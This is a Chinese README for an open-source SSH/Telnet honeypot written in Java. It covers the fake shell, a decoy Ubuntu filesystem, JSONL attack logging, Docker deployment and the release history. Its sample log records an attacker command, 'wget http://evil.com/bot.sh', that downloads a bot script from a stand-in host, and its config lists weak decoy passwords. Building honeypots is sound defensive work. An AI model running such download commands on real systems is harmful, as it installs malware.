# SSH/Telnet 蜜罐 (Java 25)

一款 ***中交互*** 蜜罐，用于捕获针对服务器的 SSH/Telnet 暴力破解与入侵行为。
基于 **Apache MINA SSHD** 实现 SSH 协议，原生 Socket 实现 Telnet 协议，
内置伪装的 Ubuntu 22.04 虚拟文件系统与伪 Shell。

> ⚠️ 仅用于安全研究与授权环境。蜜罐会吸引真实攻击者，请务必在隔离的
> 测试/专用机器上运行，不要部署在存有敏感数据的生产服务器上。

## 功能特性

- **SSH 服务**：伪装 `OpenSSH_8.9p1 Ubuntu`，任意账号密码均可"登录成功"，凭证全部记录
- **Telnet 服务**：模拟经典 `login:` 流程，含 IAC 终端协商
- **伪 Shell**：
  - 行编辑（回显、退格、上下箭头翻历史、Ctrl+C / Ctrl+D）
  - 40+ 命令：`ls` `cd` `cat` `pwd` `echo` `whoami` `id` `uname` `ps` `w` `df` `free`
    `ifconfig` `netstat` `wget` `curl` `touch` `mkdir` `rm` `history` `su` `sudo` `apt` 等
  - 支持 `;`、`&&`、管道（取首命令）、`>` / `>>` 重定向（写入虚拟文件系统）
- **虚拟文件系统**：含诱饵文件 `/etc/passwd`、`/etc/shadow`、`/root/.my.cnf`、
  `/root/.bash_history` 等，攻击者的增删改只发生在内存中
- **攻击日志**：JSONL 格式（`logs/honeypot.jsonl`），记录来源 IP、登录凭证、
  每条命令、恶意下载 URL、会话时长，可直接对接 ELK / jq 分析
- **exec 通道支持**：记录 `ssh user@host "cmd"` 形式的非交互攻击

## 构建

```bash
# 需要 JDK 25+
mvn package
# 产物：target/ssh-honeypot-j.jar（含全部依赖的可执行 jar）
```

## 运行

```bash
java -jar target/ssh-honeypot-j.jar                        # 使用默认 config.yaml
java -jar target/ssh-honeypot-j.jar -c /etc/honeypot.yaml  # 指定配置文件
```

生产环境建议叠加 JDK 25 运行时优化参数（紧凑对象头，减少海量会话对象内存占用）：

```bash
java -XX:+UseCompactObjectHeaders -jar target/ssh-honeypot-j.jar
```

### 配置文件（config.yaml）

```yaml
ssh:
  enabled: true      # 是否启用 SSH 服务
  port: 2222         # SSH 监听端口

telnet:
  enabled: true      # 是否启用 Telnet 服务
  port: 2323         # Telnet 监听端口

log:
  file: logs/honeypot.jsonl   # 攻击日志文件路径
```

配置文件不存在时使用内置默认值（SSH:2222、Telnet:2323、日志 logs/honeypot.jsonl）。

### 账号配置多密码

`auth.credentials` 支持两种写法，命中其中任意一个密码即视为登录成功：

```yaml
auth:
  maxFailures: 3
  windowMinutes: 5
  lockMinutes: 30
  credentials:
    root: ["123456", "toor", "password", "root123"]     # 一个账号多个密码
    admin: ["admin123", "admin"]                        # 列表形式多密码
    ubuntu: "ubuntu"                                    # 兼容单字符串写法
```

> 也支持在配置文件中不写 `credentials`，此时使用内置默认弱口令本。

### 映射到真实 22/23 端口（Linux）

```bash
sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
sudo iptables -t nat -A PREROUTING -p tcp --dport 23 -j REDIRECT --to-port 2323
```

注意先把真实 sshd 移到别的端口，避免把自己锁在门外。

## Docker 部署

镜像基于 JDK 25 运行时构建，开箱即用。

### 使用官方镜像（推荐）

创建 `docker-compose.yml`，将日志目录挂载到宿主机，并映射 SSH(2222) 与 Telnet(2323) 端口：

```yaml
services:
  ssh-honeypot-j:
    image: scdm/ssh-honeypot-j:latest
    container_name: ssh-honeypot-j
    restart: always
    volumes:
      - ${PWD}/logs:/app/logs
    environment:
      - TZ=Asia/Shanghai
    ports:
      - 2222:2222
      - 2323:2323
    mem_limit: 256m
```

启动：

```bash
mkdir logs
docker compose up -d
```

- `${PWD}/logs` 为宿主机日志目录，攻击日志实时写入 `./logs/honeypot.jsonl`
- `mem_limit: 256m` 限制容器内存，避免海量会话拖垮宿主机
- 如需自定义配置，可将 `config.yaml` 一并挂载：

  ```yaml
  volumes:
    - ${PWD}/logs:/app/logs
    - ${PWD}/config.yaml:/app/config.yaml
  ```

## 测试

```bash
ssh -p 2222 root@127.0.0.1        # 任意密码可登录
telnet 127.0.0.1 2323             # 任意账号密码可登录
ssh -p 2222 root@127.0.0.1 "uname -a; cat /etc/passwd"
```

## 日志格式

每行一个 JSON 事件：

```json
{"ts":"2026-08-11 15:40:01.123","event":"auth_attempt","session":"s1-...","protocol":"ssh","src_ip":"1.2.3.4","username":"root","password":"123456","success":"true"}
{"ts":"2026-08-11 15:40:05.456","event":"command","session":"s1-...","src_ip":"1.2.3.4","username":"root","command":"wget http://evil.com/bot.sh"}
{"ts":"2026-08-11 15:40:05.789","event":"download","session":"s1-...","src_ip":"1.2.3.4","username":"root","url":"http://evil.com/bot.sh"}
```

事件类型：`session_open` / `auth_attempt` / `command` / `download` / `session_close`

## 项目结构

```
docs                                     # 系统文档
src/main/java/com/honeypot/
├── Main.java                         # 入口：加载配置、启动服务、优雅关闭
├── config/HoneypotConfig.java        # YAML 配置加载（默认 config.yaml）
├── fs/
│   ├── VNode.java                   # 虚拟文件节点
│   └── VirtualFileSystem.java       # 内存文件系统（伪装 Ubuntu）
├── shell/
│   ├── FakeShell.java               # 交互式行编辑 + REPL（SSH/Telnet 共用）
│   ├── CommandProcessor.java        # 命令解释器（40+ 命令）
│   └── SessionState.java            # 会话状态（用户/目录/历史）
├── ssh/SshHoneypotServer.java        # SSH 服务（MINA SSHD）
├── telnet/TelnetHoneypotServer.java  # Telnet 服务（原生 Socket）
└── log/AttackLogger.java             # JSONL 攻击日志
config.yaml                              # 系统配置信息
```

## 支持诱捕清单
- [X] SSH
- [X] Telnet
- [X] MySQL
- [X] PostgreSQL
- [ ] Http(Nginx)
- [X] Redis

## 待办清单
- [X] 增加常用账号密码，增加错误账号拦截，让蜜罐表现更真实
- [X] 增加shell命令随机延时，避免直接回应，让蜜罐表现更真实
- [ ] 增加支持LLM，让大模型自动回应shell命令，让蜜罐表现更真实

## 版本历史

### v1.0.3（2026-08-14）

> 本期聚焦账号隔离与权限真实度，是对 1.0.2 的能力增强版本。

**新增 / 改进**
- **用户主目录隔离**：为每个登录用户生成独立的默认 `/home/<user>` 目录，攻击者在各自主目录中操作，互不干扰。
- **目录权限检查**：`cd` 命令增加权限校验，用户默认目录拒绝其他用户访问，越权访问被拒绝，行为更贴近真实 Linux 系统。
- **IP 锁定策略增强**：IP 锁定增加"计数窗口时长"配置，暴力破解计数在指定时间窗口内累计，窗口外自动回落，降低误锁正常流量。
- **密码本完善**：支持单个用户配置多个密码（列表形式），命中任一密码即视为登录成功，弱口令覆盖更全。

---

### v1.0.2（2026-08-13）

> 引入容器化交付，蜜罐可一键 Docker 部署。

**新增**
- **Docker 镜像发布**：新增 `docker-maven-plugin`，支持 `mvn deploy` 构建本地镜像并推送到 Nexus 仓库。
- 发布镜像默认附加 `latest` 标签，便于拉取最新稳定版。

**安全 / 稳定性**
- 修复客户端直接断开网络（非 `exit` 正常退出）时攻击日志无法记录的问题。

**依赖**
- sshd-core `2.19.0`、slf4j `2.0.18`、snakeyaml `2.6`、docker-maven-plugin `0.49.0`。

---

### v1.0.1（2026-08-12）

> 工程化与真实性增强版本，奠定后续多协议、多账号的基础。

**新增**
- **配置文件支持**：引入 `config.yaml`，可自定义 SSH/Telnet 端口、日志路径、账号密码本。
- **SSH/Telnet 账号密码本**：支持预置常见弱口令，登录错误达到阈值（默认 3 次）后锁定来源 IP，诱捕更真实。
- **Shell 命令随机延时**：命令响应加入随机延迟，避免秒回暴露蜜罐特征。
- **更多命令支持**：扩展伪 Shell 命令数量，提升交互真实度。
- **`free` / `df` 命令显示优化**：输出更贴近真实系统。

**工程改进**
- 项目升级至 **JDK 25**，启用紧凑对象头（JEP 519）等运行时优化。
- 代码结构优化，依赖版本统一升级。
- README 与说明文档补全。

**依赖**
- sshd-core 由 `2.12.1` 升级至 `2.19.0`、slf4j `2.0.13` → `2.0.18`、新增 snakeyaml `2.6`。

---

### v1.0.0（2026-08-11）

> 首个可用版本，提供中交互 SSH/Telnet 蜜罐核心能力。

**核心功能**
- **SSH 服务**：基于 Apache MINA SSHD 伪装 `OpenSSH_8.9p1 Ubuntu`，任意账号密码均可"登录成功"，凭证全量记录。
- **Telnet 服务**：原生 Socket 模拟经典 `login:` 流程，含 IAC 终端协商。
- **伪 Shell**：行编辑（回显、退格、历史、Ctrl+C/D）+ 40+ 常用命令（含 `;`、`&&`、管道、重定向）。
- **虚拟文件系统**：内存态伪装 Ubuntu 22.04，含 `/etc/passwd`、`/etc/shadow` 等诱饵文件，攻击者增删改仅存于内存。
- **JSONL 攻击日志**：记录来源 IP、凭证、命令、下载 URL、会话时长，可对接 ELK / jq。
- **exec 通道支持**：记录 `ssh user@host "cmd"` 形式的非交互攻击。

**说明**
- 初始依赖：sshd-core `2.12.1`、slf4j `2.0.13`。
- 此版本尚未包含 Docker 交付与账号密码本配置能力（于 1.0.1 / 1.0.2 陆续补齐）。
